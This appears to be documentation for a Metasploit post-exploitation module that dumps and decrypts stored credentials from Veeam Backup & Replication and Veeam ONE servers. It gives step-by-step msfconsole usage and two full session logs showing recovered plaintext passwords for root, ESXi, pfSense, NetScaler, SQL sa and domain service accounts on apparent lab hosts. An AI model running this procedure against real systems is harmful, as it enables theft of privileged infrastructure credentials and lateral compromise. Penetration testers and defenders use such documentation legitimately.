## Vulnerable Application

This module exports and decrypts credentials from Veeam Backup & Replication and Veeam ONE Monitor
Server to a CSV file; it is intended as a post-exploitation module for Windows hosts with either of
these products installed. The module supports automatic detection of VBR & Veeam ONE and is capable
of decrypting credentials for all versions including the latest build of 11.x. Credentials are
automatically added to loot.

## Actions

### Dump

`dump` is the default action and performs extraction of the Veeam product database parameters and
encryption keys. This action also exports SQL data and immediately decrypts it. Invoking the `dump`
action requires SYSTEM level permissions on the target host in order to extract AES keys.

### Export

`export` performs SQL data extraction of the encrypted data as a CSV file; use this option if it is
necessary to migrate the Meterpreter session to a new non-SYSTEM identity in order to access the SQL
database. Invoking the `export` action requires the Meterpreter session to be running in the context
of a user that has access to the configured SQL database.

## Verification Steps

1. Start msfconsole
2. Get session on host via method of choice and background it
3. Do: `use post/windows/gather/credentials/veeam_credential_dump`
4. Do: `set session <session>`
5. Do: `dump` to extract and decrypt, or `export` to extract the encrypted database only

If `dump` or `export` fail, the session identity may need permission to log in to SQL; see
`Scenarios`.

## Advanced Options

### BATCH_DPAPI

The module performs Windows DPAPI decryption using calls to `psh_exec`; this is not performant
when running many decryptions in sequence. By default, the module will attempt to gather and
the encrypted payloads and process them in a single batch, passing them as a static array built
on the PS command line. This greatly improves performance but may cause issues with there are a
large number of secrets that attempt to decrypt in parallel. Set this option to `false` to
suppress this behavior, and force the module to make DPAPI decryption calls sequentially rather
than in parallel batches.

## Scenarios

### SQL Data Acquisition

The `sqlcmd` binaries (part of the SQL Server Management Studio) must be installed on the system
to access the database. Columns are cast `VARBINARY` to deal with poor CSV export support in
`sqlcmd`. If the database is configured migrate the session PID to an identity with permission
to log on to the SQL server.

### Examples

Windows Server 2019 host running Veeam Backup & Recovery and Veeam ONE with SQL SSPI using the `dump` action:

```
msf6 exploit(multi/handler) > use windows/gather/credentials/veeam_credential_dump
msf6 post(windows/gather/credentials/veeam_credential_dump) > set session 1
session => 1
msf6 post(windows/gather/credentials/veeam_credential_dump) > dump

[*] Hostname VEEAM01 IPv4 192.168.101.39
[*] Veeam Backup & Replication Install Path: C:\Program Files\Veeam\Backup and Replication\Backup
[+] Compressed size: 1336
[*] Veeam Backup & Replication Build 11.0.1.1261
[*] Veeam ONE Monitor Install Path: C:\Program Files\Veeam\Veeam ONE\Veeam ONE Monitor Server
[+] Compressed size: 1268
[*] Veeam ONE Monitor Build 11.0.0.1379
[+] Compressed size: 1336
[*] Get Veeam SQL Parameters ...
[+] SQL Database Connection Configuration:
[+]     Instance Name: VEEAM01\VEEAMSQL2016
[+]     Database Name: VeeamBackup
[+]     Database User: (Windows Integrated)
[!] The database uses Windows authentication
[!] Session identity must have access to the SQL server instance to proceed
[+] SQL Database Connection Configuration:
[+]     Instance Name: VEEAM01\VEEAMSQL2016
[+]     Database Name: VeeamONE
[+]     Database User: (Windows Integrated)
[!] The database uses Windows authentication
[!] Session identity must have access to the SQL server instance to proceed
[*] Performing export of Veeam Backup & Replication SQL database to CSV file
[*] Export Veeam Backup & Replication DB ...
[+] 11 rows exported, 11 unique IDs
[+] Encrypted Veeam Backup & Replication Database Dump: /root/.msf4/loot/20221209091141_default_192.168.101.39_veeam_vbr_enc_871500.txt
[*] Performing export of Veeam ONE Monitor SQL database to CSV file
[*] Export Veeam ONE Monitor DB ...
[+] 1 rows exported, 1 unique IDs
[+] Encrypted Veeam ONE Monitor Database Dump: /root/.msf4/loot/20221209091141_default_192.168.101.39_veeam_vom_enc_278493.txt
[*] Performing decryption of Veeam Backup & Replication SQL database
[+] 11 VBR rows loaded, 11 unique IDs
[*] Process Veeam Backup & Replication DB ...
[+] Compressed size: 1408
[+] Compressed size: 4864
[+] 11 VBR rows processed
[*] 7 rows recovered: 0 plaintext, 7 decrypted (4 blank)
[*] 7 rows written (4 blank rows withheld)
[+] 7 unique VBR ID records recovered
[+] Recovered Credential: Linux root
[+]     L: root
[+]     P: SK!nP0pp3r
[+] Recovered Credential: pfSense admin
[+]     L: admin
[+]     P: Quit2Day!
[+] Recovered Credential: root
[+]     L: root
[+]     P: SK!nP0pp3r
[+] Recovered Credential: Linux user
[+]     L: cs137
[+]     P: Quit2Day!
[+] Recovered Credential: ESXi root
[+]     L: root
[+]     P: Quit2Day!
[+] Recovered Credential: CESIUM137\vSphereSvc
[+]     L: CESIUM137\vSphereSvc
[+]     P: $XklZZiCpToP5wn7
[+] Recovered Credential: NetScaler nsroot
[+]     L: nsroot
[+]     P: Quit2Day!
[+] Decrypted Veeam Backup & Replication Database Dump: /root/.msf4/loot/20221209091150_default_192.168.101.39_veeam_vbr_dec_391876.txt
[*] Performing decryption of Veeam ONE Monitor SQL database
[+] 1 VOM rows loaded, 1 unique IDs
[*] Process Veeam ONE Monitor DB ...
[+] 1 VOM rows processed
[*] 1 rows recovered: 0 plaintext, 1 decrypted (0 blank)
[*] 1 rows written (0 blank rows withheld)
[+] 1 unique VOM ID records recovered
[+] Recovered Credential: VeeamONE Credential
[+]     L: CESIUM137\vSphereSvc
[+]     P: $XklZZiCpToP5wn7
[+] Decrypted Veeam ONE Monitor Database Dump: /root/.msf4/loot/20221209091150_default_192.168.101.39_veeam_vom_dec_557706.txt
[*] Post module execution completed
msf6 post(windows/gather/credentials/veeam_credential_dump) > 
```

Windows Server 2019 host running Veeam ONE with SQL native auth using the `dump` action:

```
msf6 exploit(multi/handler) > use windows/gather/credentials/veeam_credential_dump
msf6 post(windows/gather/credentials/veeam_credential_dump) > set session 1
session => 1
msf6 post(windows/gather/credentials/veeam_credential_dump) > dump

[*] Hostname VEEAMONE IPv4 192.168.101.143
[*] Veeam ONE Monitor Install Path: C:\Program Files\Veeam\Veeam ONE\Veeam ONE Monitor Server
[+] Compressed size: 1268
[*] Veeam ONE Monitor Build 11.0.1.1880
[+] Compressed size: 1336
[*] Get Veeam SQL Parameters ...
[+] Compressed size: 2280
[+] Compressed size: 2344
[+] SQL Database Connection Configuration:
[+]     Instance Name: VEEAMONE\VEEAMSQL2016
[+]     Database Name: VeeamONE
[+]     Database User: sa
[+]     Database Pass: AintEZB3ingGr33n
[*] Performing export of Veeam ONE Monitor SQL database to CSV file
[*] Export Veeam ONE Monitor DB ...
[+] 2 rows exported, 2 unique IDs
[+] Encrypted Veeam ONE Monitor Database Dump: /root/.msf4/loot/20221209090827_default_192.168.101.143_veeam_vom_enc_319808.txt
[*] Performing decryption of Veeam ONE Monitor SQL database
[+] 2 VOM rows loaded, 2 unique IDs
[*] Process Veeam ONE Monitor DB ...
[+] Compressed size: 2248
[+] Compressed size: 2312
[+] 2 VOM rows processed
[*] 2 rows recovered: 0 plaintext, 2 decrypted (0 blank)
[*] 2 rows written (0 blank rows withheld)
[+] 2 unique VOM ID records recovered
[+] Recovered Credential: VeeamONE Credential
[+]     L: sa
[+]     P: AintEZB3ingGr33n
[+] Recovered Credential: VeeamONE Credential
[+]     L: CESIUM137\a.a.ron
[+]     P: 1n$uB0rdin@te&CHuRli$h
[+] Decrypted Veeam ONE Monitor Database Dump: /root/.msf4/loot/20221209090835_default_192.168.101.143_veeam_vom_dec_424908.txt
[*] Post module execution completed
msf6 post(windows/gather/credentials/veeam_credential_dump) >
```
